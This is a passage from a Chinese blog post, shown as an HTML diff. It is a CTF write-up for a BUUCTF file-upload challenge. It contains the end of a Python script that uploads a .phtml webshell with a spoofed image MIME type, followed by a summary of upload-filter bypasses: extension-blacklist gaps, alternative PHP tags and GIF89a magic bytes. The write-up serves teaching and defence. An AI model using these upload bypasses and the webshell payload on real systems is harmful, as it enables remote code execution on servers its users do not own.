/flag*&quot;);&lt;/script&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line">files = &#123;</span><br><span class="line">    <span class="string">&quot;file&quot;</span>: (<span class="string">&quot;shell.phtml&quot;</span>, payload, <span class="string">&quot;image/jpeg&quot;</span>),</span><br><span class="line">    <span class="string">&quot;submit&quot;</span>: (<span class="literal">None</span>, <span class="string">&quot;提交&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">resp = requests.post(url, files=files)</span><br><span class="line"><span class="built_in">print</span>(resp.text)</span><br></pre></td></tr></table></figure>
+
+<h2 id="相关知识点总结"><a href="#相关知识点总结" class="headerlink" title="相关知识点总结"></a>相关知识点总结</h2><h3 id="1-MIME-校验的脆弱性"><a href="#1-MIME-校验的脆弱性" class="headerlink" title="1. MIME 校验的脆弱性"></a>1. MIME 校验的脆弱性</h3><p>PHP 中 <code>$_FILES[&#39;file&#39;][&#39;type&#39;]</code> 完全由客户端发送的 <code>Content-Type</code> 控制，无法作为安全校验依据。攻击者可随意修改。</p>
+<h3 id="2-扩展名黑名单机制的缺陷"><a href="#2-扩展名黑名单机制的缺陷" class="headerlink" title="2. 扩展名黑名单机制的缺陷"></a>2. 扩展名黑名单机制的缺陷</h3><p>仅封禁常见的 <code>.php</code> 是不够的。攻击者可用以下扩展名绕过：</p>
+<ul>
+<li><code>.phtml</code> — Apache 中默认可解析为 PHP</li>
+<li><code>.php5</code>、<code>.php7</code> — 取决于服务器配置</li>
+<li><code>.pht</code> — 某些配置中可解析</li>
+</ul>
+<p>最佳实践：使用 <strong>白名单机制</strong>（仅允许 <code>.jpg</code>、<code>.png</code>、<code>.gif</code> 等）。</p>
+<h3 id="3-PHP-其他标签语法"><a href="#3-PHP-其他标签语法" class="headerlink" title="3. PHP 其他标签语法"></a>3. PHP 其他标签语法</h3><p>PHP 支持多种标签形式，在 <code>&lt;?</code> 被过滤时可用于绕过：</p>
+<table>
+<thead>
+<tr>
+<th>标签形式</th>
+<th>是否可用</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>&lt;?php ?&gt;</code></td>
+<td>被过滤</td>
+<td>标准标签，含 <code>&lt;?</code></td>
+</tr>
+<tr>
+<td><code>&lt;? ?&gt;</code></td>
+<td>被过滤</td>
+<td>短标签，含 <code>&lt;?</code></td>
+</tr>
+<tr>
+<td><code>&lt;?= ?&gt;</code></td>
+<td>被过滤</td>
+<td>短输出标签，含 <code>&lt;?</code></td>
+</tr>
+<tr>
+<td><code>&lt;script language=&quot;php&quot;&gt;</code></td>
+<td><strong>可用</strong></td>
+<td>已弃用，PHP 5.3 起弃用，PHP 7.0 移除</td>
+</tr>
+<tr>
+<td><code>&lt;% %&gt;</code></td>
+<td>不可用</td>
+<td>ASP 风格标签，需 <code>asp_tags=On</code></td>
+</tr>
+</tbody></table>
+<h3 id="4-Magic-Bytes-伪造"><a href="#4-Magic-Bytes-伪造" class="headerlink" title="4. Magic Bytes 伪造"></a>4. Magic Bytes 伪造</h3><p>PHP 的 <code>exif_imagetype()</code> &#x2F; <code>getimagesize()</code> 函数通过读取文件头的 magic bytes 判断文件类型。<br>常见图片文件头：</p>
+<table>
+<thead>
+<tr>
+<th>格式</th>
+<th>Magic Bytes</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>GIF</td>
+<td><code>GIF89a</code> 或 <code>GIF87a</code></td>
+</tr>
+<tr>
+<td>JPEG</td>
+<td><code>\xFF\xD8\xFF</code></td>
+</tr>
+<tr>
+<td>PNG</td>
+<td><code>\x89PNG</code></td>
+</tr>
+</tbody></table>
+<p>在最前面加上 <code>GIF89a</code> 即可绕过图像格式检测。</p>
+<h3 id="5-Nginx-Apache-反向代理架构"><a href="#5-Nginx-Apache-反向代理架构" class="headerlink" title="5. Nginx + Apache 反向代理架构"></a>5. Nginx + Apache 反向代理架构</h3><p>本靶机架构为 OpenResty(Nginx) 反代后端 Apache：</p>
+<ul>
+<li>Nginx 直接处理静态文件请求（返回 <code>Server: openresty</code>）</li>
+<li>PHP 动态请求转发给 Apache（返回 <code>Server: Apache/2.4.7 (Ubuntu)</code>）</li>
+<li>404 页面由 Apache 返回，验证了后端是 Apache</li>
+</ul>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
+<li>PHP Manual: <a target="_blank" rel="noopener" href="https://www.php.net/manual/en/language.basic-syntax.phpmode.php">PHP tags</a></li>
+<li>OWASP: <a target="_blank" rel="noopener" href="https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html">File Upload Cheat Sheet</a></li>
+</ul>
+
+  </div>
+</article>
+
+
+
+    </div>
+    
+      <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a target="_blank" rel="noopener" href="https://github.com/zhaochoudecat">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#BUUCTF-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E5%AE%9E%E6%88%98-%E4%B8%8A%E4%BC%A0%E5%A4%B4%E5%83%8F-DeepSeek-WriteUp"><span class="toc-number">1.</span> <span class="toc-text">BUUCTF - 文件上传绕过实战 (上传头像) - DeepSeek WriteUp</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E4%BF%A1%E6%81%AF"><span class="toc-number">1.1.</span> <span class="toc-text">题目信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90"><span class="toc-number">1.2.</span> <span class="toc-text">题目分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95-1%EF%BC%9A%E7%9B%B4%E6%8E%A5%E4%B8%8A%E4%BC%A0-PHP-%E6%96%87%E4%BB%B6-%E2%86%92-%E5%8F%91%E7%8E%B0%E6%89%A9%E5%B1%95%E5%90%8D%E6%A3%80%E6%B5%8B"><span class="toc-number">1.2.1.</span> <span class="toc-text">测试 1：直接上传 PHP 文件 → 发现扩展名检测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95-2%EF%BC%9A%E5%AF%B9%E6%AF%94%E4%B8%8D%E5%90%8C%E6%89%A9%E5%B1%95%E5%90%8D%EF%BC%8C%E5%AE%9A%E4%BD%8D%E7%AC%AC%E4%B8%80%E9%81%93%E9%98%B2%E7%BA%BF-%E2%86%92-%E5%8F%91%E7%8E%B0-MIME-%E7%B1%BB%E5%9E%8B%E6%A3%80%E6%B5%8B"><span class="toc-number">1.2.2.</span> <span class="toc-text">测试 2：对比不同扩展名，定位第一道防线 → 发现 MIME 类型检测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95-3%EF%BC%9A%E7%BB%95%E8%BF%87-MIME-%E7%B1%BB%E5%9E%8B%EF%BC%8C%E8%A7%A6%E5%8F%91%E5%86%85%E5%AE%B9%E6%A3%80%E6%B5%8B-%E2%86%92-%E5%8F%91%E7%8E%B0"><span class="toc-number">1.2.3.</span> <span class="toc-text">测试 3：绕过 MIME 类型，触发内容检测 → 发现 &lt;? 过滤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95-4%EF%BC%9A%E4%BD%BF%E7%94%A8-%E7%BB%95%E8%BF%87"><span class="toc-number">1.2.4.</span> <span class="toc-text">测试 4：使用 &lt;script language&#x3D;&quot;php&quot;&gt; 绕过 &lt;? 过滤 → 发现 Magic Bytes 检测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95-5%EF%BC%9A%E6%9C%80%E7%BB%88%E7%BB%95%E8%BF%87-%E2%80%94-GIF89a-phtml-MIME-script%E6%A0%87%E7%AD%BE"><span class="toc-number">1.2.5.</span> <span class="toc-text">测试 5：最终绕过 — GIF89a + .phtml + MIME + script标签</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%9D%E5%A4%96%E6%AD%A5%E9%AA%A4%EF%BC%9A%E5%AE%9A%E4%BD%8D%E4%B8%8A%E4%BC%A0%E7%9B%AE%E5%BD%95"><span class="toc-number">1.2.6.</span> <span class="toc-text">额外步骤：定位上传目录</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E6%9D%A1%E4%BB%B6%E6%B1%87%E6%80%BB"><span class="toc-number">1.3.</span> <span class="toc-text">绕过条件汇总</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploit-%E8%BF%87%E7%A8%8B"><span class="toc-number">1.4.</span> <span class="toc-text">Exploit 过程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E6%AD%A5%EF%BC%9A%E6%9E%84%E9%80%A0-Payload-%E5%B9%B6%E4%B8%8A%E4%BC%A0"><span class="toc-number">1.4.1.</span> <span class="toc-text">第一步：构造 Payload 并上传</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E6%AD%A5%EF%BC%9A%E8%AE%BF%E9%97%AE-Webshell-%E8%8E%B7%E5%8F%96-Flag"><span class="toc-number">1.4.2.</span> <span class="toc-text">第二步：访问 Webshell 获取 Flag</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Python-Exploit-%E7%89%88%E6%9C%AC"><span class="toc-number">1.5.</span> <span class="toc-text">Python Exploit 版本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93"><span class="toc-number">1.6.</span> <span class="toc-text">相关知识点总结</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-MIME-%E6%A0%A1%E9%AA%8C%E7%9A%84%E8%84%86%E5%BC%B1%E6%80%A7"><span class="toc-number">1.6.1.</span> <span class="toc-text">1. MIME 校验的脆弱性</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%89%A9%E5%B1%95%E5%90%8D%E9%BB%91%E5%90%8D%E5%8D%95%E6%9C%BA%E5%88%B6%E7%9A%84%E7%BC%BA%E9%99%B7"><span class="toc-number">1.6.2.</span> <span class="toc-text">2. 扩展名黑名单机制的缺陷</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-PHP-%E5%85%B6%E4%BB%96%E6%A0%87%E7%AD%BE%E8%AF%AD%E6%B3%95"><span class="toc-number">1.6.3.</span> <span class="toc-text">3. PHP 其他标签语法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-Magic-Bytes-%E4%BC%AA%E9%80%A0"><span class="toc-number">1.6.4.</span> <span class="toc-text">4. Magic Bytes 伪造</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-Nginx-Apache-%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E6%9E%B6%E6%9E%84"><span class="toc-number">1.6.5.</span> <span class="toc-text">5. Nginx + Apache 反向代理架构</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">1.7.</span> <span class="toc-text">参考</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://zhaochoudecat.github.io/2026/05/02/BUUCTF/WEB/6-upload-deepseek/"><i class="fa fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://zhaochoudecat.github.io/2026/05/02/BUUCTF/WEB/6-upload-deepseek/&text=BUUCTF - 文件上传绕过实战 (上传头像) - DeepSeek WriteUp"><i class="fa fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://zhaochoudecat.github.io/2026/05/02/BUUCTF/WEB/6-upload-deepseek/&title=BUUCTF - 文件上传绕过实战 (上传头像) - DeepSeek WriteUp"><i class="fa fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://zhaochoudecat.github.io/2026/05/02/BUUCTF/WEB/6-upload-deepseek/&is_video=false&description=BUUCTF - 文件上传绕过实战 (上传头像) - DeepSeek WriteUp"><i class="fa fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=BUUCTF - 文件上传绕过实战 (上传头像) - DeepSeek WriteUp&body=Check out this article: https://zhaochoudecat.github.io/2026/05/02/BUUCTF/WEB/6-upload-deepseek/"><i class="fa fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://zhaochoudecat.github.io/2026/05/02/BUUCTF/WEB/6-upload-deepseek/&title=BUUCTF - 文件上传绕过实战 (上传头像) - DeepSeek WriteUp"><i class="fa fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://zhaochoudecat.github.io/2026/05/02/BUUCTF/WEB/6-upload-deepseek/&title=BUUCTF - 文件上传绕过实战 (上传头像) - DeepSeek WriteUp"><i class="fa fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://zhaochoudecat.github.io/2026/05/02/BUUCTF/WEB/6-upload-deepseek/&title=BUUCTF - 文件上传绕过实战 (上传头像) - DeepSeek WriteUp"><i class="fa fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://zhaochoudecat.github.io/2026/05/02/BUUCTF/WEB/6-upload-deepseek/&title=BUUCTF - 文件上传绕过实战 (上传头像) - DeepSeek WriteUp"><i class="fa fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://zhaochoudecat.github.io/2026/05/02/BUUCTF/WEB/6-upload-deepseek/&name=BUUCTF - 文件上传绕过实战 (上传头像) - DeepSeek WriteUp&description="><i class="fa fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+      <ul>
+        <li id="toc"><a class="icon" href="#" onclick='$("#toc-footer").toggle();return false;'><i class="fa fa-list fa-lg" aria-hidden="true"></i> TOC</a></li>
+        <li id="share"><a class="icon" href="#" onclick='$("#share-footer").toggle();return false;'><i class="fa fa-share-alt fa-lg" aria-hidden="true"></i> Share</a></li>
+        <li id="top" style="display:none"><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a></li>
+        <li id="menu"><a class="icon" href="#" onclick='$("#nav-footer").toggle();return false;'><i class="fa fa-bars fa-lg" aria-hidden="true"></i> Menu</a></li>
+      </ul>
+    </div>
+
+  </div>
+</div>
+
+    
+    <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2026 zhaochoudecat
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a target="_blank" rel="noopener" href="https://github.com/zhaochoudecat">Projects</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+</body>
+</html>
+<!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+
+
+<link rel="stylesheet" href="/lib/meslo-LG/styles.css">
+
+
+<link rel="stylesheet" href="/lib/justified-gallery/justifiedGallery.min.css">
+
+
+
+<!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/lib/justified-gallery/jquery.justifiedGallery.min.js"></script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- Google Analytics -->
+
+    <script type="text/javascript">
+        (function(i,s,o,g,r,a,m) {i['GoogleAnalyticsObject']=r;i[r]=i[r]||function() {
+        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+        ga('create', 'UA-86660611-1', 'auto');
+        ga('send', 'pageview');
+    </script>
+
+<!-- Disqus Comments -->
+
+
